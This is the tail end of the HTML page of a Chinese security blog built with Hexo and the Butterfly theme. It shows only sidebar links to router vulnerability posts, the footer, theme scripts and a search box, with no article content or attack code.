漏洞分析"/></a><div class="content"><a class="title" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析">GL-iNet 路由器 CVE-2024-39226 漏洞分析</a><time datetime="2025-07-30T03:04:06.914Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="启动路由器环境"/></a><div class="content"><a class="title" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境">启动路由器环境</a><time datetime="2025-07-30T03:04:06.907Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复路由器程序运行环境+远程调试"/></a><div class="content"><a class="title" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试">修复路由器程序运行环境+远程调试</a><time datetime="2025-07-30T03:04:06.906Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ikuai-3.7.10版本以下有授权的cmd执行复现"/></a><div class="content"><a class="title" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现">ikuai-3.7.10版本以下有授权的cmd执行复现</a><time datetime="2025-07-30T03:04:06.904Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
